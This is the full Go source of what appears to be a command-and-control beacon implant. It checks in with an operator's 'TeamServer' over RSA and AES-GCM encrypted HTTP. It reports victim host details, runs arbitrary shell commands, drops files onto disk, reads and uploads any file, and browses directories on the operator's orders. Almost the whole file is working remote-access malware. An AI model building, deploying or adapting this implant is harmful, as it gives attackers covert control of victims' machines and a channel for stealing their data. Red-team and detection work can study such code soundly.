package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"time"

)

//go:embed listener.pub
var listenerPublicKey []byte

var (
	serverURL     string // To be set at build time via -ldflags
	beaconID      string
	sessionID     string
	sessionKey    []byte
	sleepInterval = 5 * time.Second
	jitter        = 2 * time.Second
)

// --- Structs for JSON marshaling ---

type BeaconMetadata struct {
	PID           int    `json:"pid"`
	OS            string `json:"os"`
	Arch          string `json:"arch"`
	Username      string `json:"username"`
	Hostname      string `json:"hostname"`
	InternalIP    string `json:"internal_ip"`
	ProcessName   string `json:"process_name"`
	IsHighIntegrity bool   `json:"is_high_integrity"`
}

type StagingResponse struct {
	AssignedBeaconID string `json:"assigned_beacon_id"`
}

type Task struct {
	TaskID    string `json:"task_id"`
	CommandID uint32 `json:"command_id"`
	Arguments []byte `json:"arguments"`
}

type CheckInResponse struct {
	Tasks    []*Task `json:"tasks"`
	NewSleep int32   `json:"new_sleep"`
}

type FileInfo struct {
	Name        string `json:"name"`
	IsDir       bool   `json:"is_dir"`
	Size        int64  `json:"size"`
	LastModTime string `json:"last_mod_time"`
}

// --- Main Logic ---

func main() {
	if serverURL == "" {
		log.Fatal("serverURL is not set. Please set it at build time using -ldflags.")
	}

	if err := performHandshake(); err != nil {
		log.Fatalf("Handshake failed: %v", err)
	}
	log.Println("Handshake successful, session established.")

	if err := stageBeacon(); err != nil {
		log.Fatalf("Staging failed: %v", err)
	}
	log.Printf("Staged successfully, got BeaconID: %s", beaconID)

	checkInLoop()
}

func checkInLoop() {
	log.Println("Entering check-in loop...")
	for {
		time.Sleep(sleepInterval)
		log.Printf("Checking in for tasks (interval: %s)...", sleepInterval)

		checkinReqMap := map[string]string{"beacon_id": beaconID}
		checkinReqBody, _ := json.Marshal(checkinReqMap)

		encryptedCheckin, err := encrypt(checkinReqBody)
		if err != nil {
			log.Printf("Failed to encrypt checkin data: %v", err)
			continue
		}

		checkinResp, err := doPost(serverURL+"/checkin", encryptedCheckin)
		if err != nil {
			log.Printf("Check-in failed: %v", err)
			continue
		}

		var checkinData CheckInResponse
		if err := json.Unmarshal(checkinResp, &checkinData); err != nil {
			log.Printf("Failed to decode check-in response: %v", err)
			continue
		}

		if len(checkinData.Tasks) == 0 {
			log.Println("No tasks received.")
			continue
		}

		processTasks(checkinData.Tasks)
	}
}

func processTasks(tasks []*Task) {
	for _, task := range tasks {
		var output []byte
		var execErr error

		switch task.CommandID {
		case 1: // Shell
			output, execErr = executeShellCommand(string(task.Arguments))
		case 2: // Download
			execErr = handleDownloadTask(task.Arguments)
			if execErr == nil {
				output = []byte("File downloaded successfully.")
			}
		case 3: // Upload
			output, execErr = handleUploadTask(task.Arguments)
		case 4: // Exit
			log.Println("Received exit command. Terminating.")
			os.Exit(0)
		case 5: // Sleep
			var newSleep int32
			// 调试：打印原始参数
			log.Printf("Sleep task received. TaskID: %s, Arguments length: %d, Arguments raw: %q", task.TaskID, len(task.Arguments), string(task.Arguments))

			if len(task.Arguments) == 0 {
				execErr = fmt.Errorf("empty sleep arguments")
			} else {
				// 尝试解析为JSON数字或字符串
				var sleepValue interface{}
				if err := json.Unmarshal(task.Arguments, &sleepValue); err != nil {
					execErr = fmt.Errorf("invalid JSON: %v", err)
				} else {
					// 处理数字或字符串格式
					switch v := sleepValue.(type) {
					case float64: // JSON数字: 30
						newSleep = int32(v)
					case string: // JSON字符串: "30"
						if parsed, err := parseInt32(v); err != nil {
							execErr = fmt.Errorf("invalid sleep value: %s", v)
						} else {
							newSleep = parsed
						}
					default:
						execErr = fmt.Errorf("unsupported sleep argument type: %T", v)
					}

					// 验证范围
					if execErr == nil {
						if newSleep < 1 || newSleep > 3600 {
							execErr = fmt.Errorf("sleep value must be between 1 and 3600 seconds, got %d", newSleep)
						} else {
							sleepInterval = time.Duration(newSleep) * time.Second
							log.Printf("Updated check-in interval to %s", sleepInterval)
							output = []byte(fmt.Sprintf("Sleep interval set to %d seconds", newSleep))
						}
					}
				}
			}
		case 6: // Browse
			output, execErr = handleBrowseTask(task.Arguments)
		default:
			execErr = fmt.Errorf("unknown command ID: %d", task.CommandID)
		}

		if execErr != nil {
			log.Printf("Error executing task %s: %v", task.TaskID, execErr)
			output = []byte(fmt.Sprintf("Task failed: %v", execErr))
		}

		pushTaskOutput(task.TaskID, output)
	}
}

func pushTaskOutput(taskID string, output []byte) {
	outputMap := map[string]interface{}{
		"beacon_id": beaconID,
		"task_id":   taskID,
		"output":    output,
	}
	outputReqBody, _ := json.Marshal(outputMap)

	encryptedOutput, err := encrypt(outputReqBody)
	if err != nil {
		log.Printf("Failed to encrypt task output for %s: %v", taskID, err)
		return
	}

	_, err = doPost(serverURL+"/output", encryptedOutput)
	if err != nil {
		log.Printf("Failed to push output for task %s: %v", taskID, err)
	} else {
		log.Printf("Successfully pushed output for task %s", taskID)
	}
}

// --- HTTP & Staging ---

func stageBeacon() error {
	hostname, _ := os.Hostname()
	metadata := BeaconMetadata{
		PID:           os.Getpid(),
		OS:            runtime.GOOS,
		Arch:          runtime.GOARCH,
		Username:      getUsername(),
		Hostname:      hostname,
		InternalIP:    getInternalIP(),
		ProcessName:   os.Args[0],
		IsHighIntegrity: false, // Simplified
	}

	jsonData, err := json.Marshal(metadata)
	if err != nil {
		return fmt.Errorf("failed to marshal metadata: %v", err)
	}

	encryptedData, err := encrypt(jsonData)
	if err != nil {
		return fmt.Errorf("failed to encrypt staging data: %v", err)
	}

	decryptedBody, err := doPost(serverURL+"/stage", encryptedData)
	if err != nil {
		return err
	}

	var stageResp StagingResponse
	if err := json.Unmarshal(decryptedBody, &stageResp); err != nil {
		return fmt.Errorf("failed to decode staging response: %v", err)
	}

	beaconID = stageResp.AssignedBeaconID
	return nil
}

func doPost(url string, body []byte) ([]byte, error) {
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Session-ID", sessionID)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		log.Println("Beacon not found on TeamServer. Terminating.")
		os.Exit(0) // Exit if beacon is disowned
	}

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("request failed with status %s: %s", resp.Status, string(respBody))
	}

	encryptedBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	return decrypt(encryptedBody)
}

// --- Encryption & Handshake ---

func performHandshake() error {
	key := make([]byte, 32) // AES-256
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("could not generate session key: %v", err)
	}
	sessionKey = key

	block, _ := pem.Decode(listenerPublicKey)
	if block == nil {
		return fmt.Errorf("failed to decode PEM block containing public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return fmt.Errorf("failed to parse public key: %v", err)
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return fmt.Errorf("public key is not an RSA key")
	}

	encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPub, sessionKey, nil)
	if err != nil {
		return fmt.Errorf("failed to encrypt session key: %v", err)
	}

	resp, err := http.Post(serverURL+"/handshake", "application/octet-stream", bytes.NewBuffer(encryptedKey))
	if err != nil {
		return fmt.Errorf("failed to send handshake request: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("handshake failed with status %s: %s", resp.Status, string(body))
	}

	var respBody struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&respBody); err != nil {
		return fmt.Errorf("failed to decode handshake response: %v", err)
	}

	sessionID = respBody.SessionID
	if sessionID == "" {
		return fmt.Errorf("listener did not return a session ID")
	}

	return nil
}

func encrypt(plaintext []byte) ([]byte, error) {
	c, err := aes.NewCipher(sessionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decrypt(ciphertext []byte) ([]byte, error) {
	c, err := aes.NewCipher(sessionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// --- Helper Functions ---

func getUsername() string {
	currentUser, err := user.Current()
	if err != nil {
		return "unknown"
	}
	return currentUser.Username
}

func getInternalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "127.0.0.1"
}

func executeShellCommand(command string) ([]byte, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	return cmd.CombinedOutput()
}

func handleDownloadTask(args []byte) error {
	var taskArgs struct {
		DestPath string `json:"dest_path"`
		FileData string `json:"file_data"` // base64 encoded
	}
	if err := json.Unmarshal(args, &taskArgs); err != nil {
		return fmt.Errorf("could not unmarshal download args: %v", err)
	}

	fileData, err := base64.StdEncoding.DecodeString(taskArgs.FileData)
	if err != nil {
		return fmt.Errorf("could not decode file data: %v", err)
	}

	log.Printf("Writing %d bytes to %s", len(fileData), taskArgs.DestPath)
	return os.WriteFile(taskArgs.DestPath, fileData, 0644)
}

func handleUploadTask(args []byte) ([]byte, error) {
	sourcePath := string(args)
	log.Printf("Reading file from %s to upload", sourcePath)
	return os.ReadFile(sourcePath)
}

func handleBrowseTask(args []byte) ([]byte, error) {
	dirPath := string(args)
	log.Printf("Browsing directory: %s", dirPath)

	absoluteDirPath, err := filepath.Abs(dirPath)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve absolute path for %s: %v", dirPath, err)
	}

	entries, err := os.ReadDir(absoluteDirPath)
	if err != nil {
		log.Printf("Error reading directory %s: %v", absoluteDirPath, err)
		jsonOutput, _ := json.Marshal([]FileInfo{})
		return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
	}

	files := make([]FileInfo, 0)
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			log.Printf("Warning: failed to get info for %s: %v", entry.Name(), err)
			continue
		}
		files = append(files, FileInfo{
			Name:        info.Name(),
			IsDir:       info.IsDir(),
			Size:        info.Size(),
			LastModTime: info.ModTime().Format(time.RFC3339),
		})
	}

	jsonOutput, err := json.Marshal(files)
	if err != nil {
		log.Printf("Error marshaling file info to JSON for %s: %v", dirPath, err)
		jsonOutput = []byte("[]")
	}

	return []byte(absoluteDirPath + "\n" + string(jsonOutput)), nil
}

// parseInt32 解析字符串为int32
func parseInt32(s string) (int32, error) {
	var result int64
	var err error
	if result, err = strconv.ParseInt(s, 10, 32); err != nil {
		return 0, err
	}
	return int32(result), nil
}
